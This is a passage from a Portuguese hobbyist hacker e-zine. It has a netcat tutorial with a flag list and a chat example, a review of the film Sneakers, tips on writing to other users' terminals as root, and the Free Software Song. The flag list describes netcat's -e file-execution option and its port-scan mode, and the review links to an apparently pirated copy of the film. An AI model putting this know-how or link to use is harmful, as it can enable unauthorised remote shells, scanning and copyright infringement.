+     Quando instalado em uma máquina, o netcat pode ser utilizado com o comando "nc" seguido
+     de parâmetros. Basicamente, pode ser usado como servidor ou cliente.
+
+    [ Parâmetros de utilização
+
+     Por ser em modo texto, operar o netcat é necessário saber os parâmetros necessários. Os
+     parâmetros são simples caracteres que representam o que queremos fazer com o ele.
+     Dentre os vários parâmetros existentes, vejamos os mais utilizados:
+
+     -l : listen, deixa o netcat em estado de escuta, esperando por uma conexão (geralmente usado
+          em conjunto com o parâmetro -p).
+     -p : port, define uma porta á ser usada para receber conexões.Ele é usado com a junção -p
+          seguido do número da porta que será aberta. (Ex: nc -l -p 23)
+
+          Obs: Se você rodar o netcat apenas no modo listen (-l), sem especificar a porta com
+          -p, ele irá abrir uma porta alta de numeração aleatória.
+
+     -v : verbose, com esta opção o processo de conexão será mais detalhado.
+     -e: filename, especifica um arquivo que será executado após receber uma conexão.
+     -u: UDP, por padrão, o netcat utiliza o protocolo TCP. Com a opção -u, faremos conexões
+         usando o UDP.
+     -z: zero mode, o modo zero faz com que o nc ao se conectar em um servidor, não mostre
+         o banner e nem espere interação do usuário. Uso para portscan.
+     -n: não fazer resolução de nomes.
+     -w: especifica quantos segundos a conexão ficará estabelecida.
+
+   [ Chat: o exemplo mais clichê do netcat!
+
+    Para fazer uma espécie de Chat, teremos que abrir uma porta em uma máquina que irá atuar
+    como servidor e se conectar á esta porta por uma outra máquina que será a cliente.
+    Para isto usaremos a seguinte sintaxe na máquina servidora:
+
+    C:\> nc -lvp 8989
+
+    Explicação: o comando nc irá chamar o netcat, o parâmetro -l deixará em modo de 'listagem'
+    á espera de conexão.A opção -v serve para que o processo de conexão seje detalhada, mostrando
+    os dados que são transferidos enquanto há conexão, e por fim vem o parâmetro -p seguido de 8989,
+    isto fará com que o netcat abra uma porta de numeração 8989.
+
+    OBS: Podemos unir os parâmetros ou usá-los de forma separada.
+    Ex: nc -l -v -p 8989
+
+    Na máquina cliente não há segredos para se conectar, podemos usar o netcat para este procedimento
+    ou o próprio cliente telnet do sistema operacional.
+
+    Conectaremos da seguinte forma:
+
+    C:\> telnet IP.DO.SERVIDOR 8989
+    (Ex: telnet 127.0.0.1 8989)
+
+    O que ocorrerá após o cliente se conectar é o que se assemelha á um chat, ambos os usuários das
+    duas máquinas poderão escrever no shell. Os caracteres que serão digitados são exibidos em tempo
+    real na outra máquina.
+
+               [5]========================================[+]
+                 |           Filmes Hacku's     	  |
+               [+]========================================[5]
+
+                             Sneakers (1992)
+
+      Este filme sem dúvida é um dos melhores que eu já vi do gênero. Encontrei possíveis
+      referências que podem indicar que Dan Brown antes de escrever o livro "Fortaleza Digital"
+      possa ter assistido este filme primeiro.
+      Enfim, o filme conta a aventura de um grupo de hackers(?) que trabalham com identificação
+      de vulnerabilidades em empresas. Conversa vai conversa vem, eles são contratados por uns
+      caras que se dizem da NSA (National Security Agency, local onde eu trabalho ;), a missão
+      deles é roubar um equipamento desenvolvido por um matemático que consegue quebrar qualquer
+      criptografia (Obs, olha a ambiguidade aÊ, era o equipamento que quebra criptografia, não o
+      matemático ok ?).
+
+      O filme tem algumas doses de humor (mas não é comédia), e teve um roteiro muito bem escrito.
+      Para saber mais sobre o filme, a melhor coisa seria baixando-o no link abaixo:
+
+      http://www.fileswap.com/dl/9ZqXEs4dJ/Filme_-_Sneakers_%28_Quebra_de_Sigilo_1992_%29.rar.html
+
+      Obs:  Na época em que eu tinha baixado esse filme, foi no finado Megaupload. Procurando na
+            internet eu achei esse link torrent aí!
+      Obs²: O filme ficou conhecido aqui no Brasil como "Quebra de sigilo" e está disponível
+            no Netflix.
+
+               [6]========================================[+]
+                 | Enviando mensagens para users logados  |
+               [+]========================================[6]
+
+     Nesta dica mostrarei um truque aparentemente simples, mas interessante de
+     se fazer em ambiente linux.
+     Primeiramente teremos que ter conhecimento de que o Linux e outros Unixes
+     são S.O's multiusuários, e cada usuário logado na máquina possui seu respectivo
+     tty sendo utilizado. Estes tty's são pseudo-arquivos localizados no diretório /dev .
+
+     Quando se é administrador da máquina em que se tem outros usuários logados no
+     sistema, é possivel, em modo texto, enviar mensagens para os outros usuários. Quando
+     eu disse "administrador da máquina", quis dizer de uma maneira mais bonitinha
+     sobre ter que usar o usuário "Root" para realizar tal faceta.
+
+     Let's Go !
+
+     Com o comando 'w', visualizarei os users logados no sistema.
+
+     root@LINUX:~# w
+       12:21:36 up 46 min,  4 users,  load average: 0,53, 0,57, 0,54
+     USER          TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+     b0b1m         tty1     -                11:59   20:29   0.85s  0.59s -bash
+     b0b0_d4_c0rt3 tty7     :0               11:35    3:46m  1:19   0.06s /bin/sh /etc/xd
+     b0b0_d4_c0rt3 pts/0    :0.0             12:19    1:09   0.56s  0.56s bash
+     b0b0_d4_c0rt3 pts/1    :0.0             12:20    0.00s  0.80s  0.91s xfce4-terminal
+
+    Para mandar uma mensagem para o usuário do tty1, o user 'b0b1m', farei o seguinte:
+
+    root@LINUX:~# echo " O que você tá fazendo aqui? " > /dev/tty1
+
+    Explicação:
+
+      echo      = Comando para impressão de caracteres.
+      " "       = O conteúdo entres aspas são o que será impresso pelo 'echo'.
+      >         = Redirecionador de saída, que aponta para o caminho do tty1.
+      /dev/tty1 = Caminho para o tty1, usado pelo usuário 'b0b1m'.
+
+    Como resultado teremos no shell do 'b0b1m':
+
+    b0b1m@LINUX:~$ O que você tá fazendo aqui?
+
+    Para voltar ao bash, é só pressionar 'Enter'.
+
+    Mas esta não é única forma de se mandar mensagens para outros usuários. Existem
+    maneiras mais formais de se fazer isso sem gabiarras rs.
+
+    Vamos usar o comando "write". Com ele a gente consegue escrever no tty de outros
+    usuários. A sintaxe do comando é a seguinte:
+
+                             write USUARIO [tty]
+
+    O tty pode ser opcional, mas é legal especificar. Exemplo:
+
+    root@Deadpool:~# write root tty1
+    write: write: you have write permission turned off.
+    Lucia nao faz a pessega!
+
+    Após digitar a mensagem, é dar um Ctrl + D e a mensagem será enviada.
+
+               [7]========================================[+]
+                 |           Free Software song        	  |
+               [+]========================================[7]
+
+     Há pouco tempo, tive a oportunidade de ver o grande Richard Stallman em um evento
+     de software livre. Comprei até um broche das mãos dele! rsrs
+
+     Mas enfim, no final da palestra dele (com direito a explosões de raiva e palavrões),
+     ele cantou uma música até então inédito aos meus ouvidos:
+
+                     O HINO DO SOFTWARE LIVRE
+
+                Join us now and share the software;
+                You'll be free, hackers, you'll be free.
+                Join us now and share the software;
+                You'll be free, hackers, you'll be free.
+
+                Hoarders can get piles of money,
+                That is true, hackers, that is true.
+                But they cannot help their neighbors;
+                That's not good, hackers, that's not good.
+
+                When we have enough free software
+                At our call, hackers, at our call,
+                We'll kick out those dirty licenses
+                Ever more, hackers, ever more.
+
+                Join us now and share the software;
+                You'll be free, hackers, you'll be free.
+                Join us now and share the software;
+                You'll be free, hackers, you'll be free.
+
+           http://www.gnu.org/music/free-software-song.html
+
+     Admiro muito a filosofia do open source, não sou um militante do software livre ou algo
+     assim, mas achei interessante a música. Link de um vídeo dele cantando a música:
+
+           http://www.youtube.com/watch?v=1BH7poMtPVU
+
+               [8]========================================[+]
+                 |                  FIM         	  |
+               [+]========================================[8]
+
+     Espero que essa edição tenha superado a primeira e que tenha novas
+     edições por um bom tempo. E é claro, que o conteúdo sempre evolua!
+     Vou estudar mais aqui... e tentar escrever mais textos para a próxima
+     edição.
+
+     Telefone para contato: 415 723 9709
+     Twitter: @B0b0_d4_c0rt3
+     Email:   b0b0.d4.c0rt3@gmail.com
+     Endereço: Rua dos b0b0s, n° 0
+
+     Encerro por aqui.
+     Cruji Cruji Cruji thau!
+
+EOF
